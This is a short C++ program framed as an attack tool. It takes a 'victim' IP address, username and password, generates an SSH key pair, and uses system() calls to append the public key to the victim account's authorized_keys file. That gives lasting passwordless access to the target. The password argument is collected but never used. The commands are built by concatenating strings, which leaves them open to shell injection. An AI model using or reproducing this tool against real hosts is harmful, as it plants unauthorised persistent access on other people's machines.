#include <bits/stdc++.h>
#include <unistd.h>
using namespace std;
void cmd(string s) {
    system(s.c_str());
}
void cmd_on_victim(string ssh_prefix, string s) {
    cmd(ssh_prefix + " \'" + s + "\'");
}
int main(int argc, char **argv) {
    if (argc < 4) {
        cout << "Usage: " << argv[0] << " <victim IP address> <username> <password>\n";
        return 0;
    }
    cmd("ssh-keygen -t rsa");
    string ip_addr  = string(argv[1]);
    string username = string(argv[2]);
    string password = string(argv[3]);
    string ssh_prefix = "ssh " + username + "@" + ip_addr;

    cmd("cat ~/.ssh/id_rsa.pub | " + ssh_prefix + " ' cat >>.ssh/authorized_keys'");
    cmd_on_victim(ssh_prefix, "chmod 600  ~/.ssh/authorized_keys");
}
